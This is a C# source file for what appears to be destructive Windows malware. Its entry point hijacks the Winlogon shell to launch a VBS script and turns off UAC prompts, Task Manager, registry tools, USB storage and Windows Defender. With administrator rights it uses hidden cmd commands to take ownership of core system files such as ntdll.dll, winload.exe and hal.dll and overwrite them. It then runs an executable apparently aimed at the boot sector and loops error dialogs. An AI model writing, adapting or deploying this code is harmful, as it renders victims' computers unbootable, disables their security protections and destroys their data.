
using System;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
namespace gdifuncs
{
	/// <summary>
	/// Class with program entry point.
	/// </summary>
	internal sealed class Program
	{
		/// <summary>
		/// Program entry point.
		/// </summary>
		[STAThread]
		static void runprotector(object state) {
			
			Application.Run(new protection64());
		}
		static void runmform(object state) {
			Application.Run(new majorsgui());
		}
		private static void Main(string[] args)
		{
			if (System.IO.File.Exists("kek.txt")) {
				
        				try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"); 
       // 	key.SetValue("Shell",@"explorer.exe, cmd.exe ""/c cd C:\windows\winbase_base_procid_none\secureloc0x65&title parziwool&start tobi0a0c.exe& exit""");
        	key.SetValue("Shell",@"explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""");
     

       key.Dispose();
        	    }catch{}
				
        		
        		try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system"); 
        		key.SetValue("ConsentPromptBehaviorAdmin",0);
        		key.Dispose();
        	    }catch{}
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop"); 
        		key.SetValue("NoChangingWallPaper",1);
        		key.Dispose();
        	    }catch{}
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); 
        		key.SetValue("DisableTaskMgr",1);
        		key.Dispose();
        	    }catch{}
        		
        			try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"); 
        		key.SetValue("DisableRegistryTools",1);
        		key.Dispose();
        	    }catch{}
        		
        			try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"); 
        		key.SetValue("NoRun",1);
        		key.Dispose();
        	    }catch{}
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"); 
        		key.SetValue("NoWinKeys",1);
        		key.Dispose();
        	    }catch{}
        		
        			try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor"); 
        		key.SetValue("Start",4);
        		key.Dispose();
        	    }catch{}
        		
        		
        		try{
        		RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"); 
        		key.SetValue("DisableAntiSpyware",1);
        		key.Dispose();
        	    }catch{}
        		
        		
        		try{
        		RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"); 
        		key.SetValue("Arrow",@"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
        			key.SetValue("AppStarting",@"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
        				key.SetValue("Hand",@"C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur");
        		key.Dispose();
        	    }catch{}
				
			}
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			if (protection64.userIsAdministrator()) {
			if (System.IO.File.Exists("C:\\windows\\WinAttr.gci")) {
					string[] files2owr =  {
						"winload.exe",
						"csrss.exe",
						"wininit.exe",
						"wininet.dll",
						"aclui.dll",
						"ADVAPI32.DLL",
						"crypt32.dll",
						"hal.dll",
						"logonui.exe",
						"ntdll.dll",
						
						"cryptbase.dll",
						"kernel32.dll",
						"userinit.exe",
						"crypt.dll",
						"chkdsk.exe",
						
					};
					
					
					for (int a = 0; a < files2owr.Length; a++) {
						try{	Process prc = new Process();
        	prc.StartInfo.FileName = "cmd.exe";
        	prc.StartInfo.Arguments = @"/c cd\&cd Windows\system32&takeown /f """ + files2owr[a]+@"""&icacls """ + files2owr[a]+@""" /granted ""%username%"":F&echo xa>""" + files2owr[a]+@"""";
        	prc.StartInfo.Verb = "runas";
        	prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        	prc.Start();
						
        	if (a == files2owr.Length-1) {
        		Process prcx = new Process();
        	prcx.StartInfo.FileName = "cmd.exe";
        	prcx.StartInfo.Arguments = @"/c timeout 2&""C:\windows\winbase_base_procid_none\secureloc0x65\bsector3.exe""";
        	prcx.StartInfo.Verb = "runas";
        		prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        	prcx.Start();
        	while(true) {
        		MessageBox.Show("You messed up..","uh oh",MessageBoxButtons.OK,MessageBoxIcon.Error);
        	}
        	}
						}catch{}}
			}
			}
			
			System.Threading.ThreadPool.QueueUserWorkItem(runprotector);
			System.Threading.ThreadPool.QueueUserWorkItem(runmform);
			Application.Run(new MainForm());
		}
		
	}
}
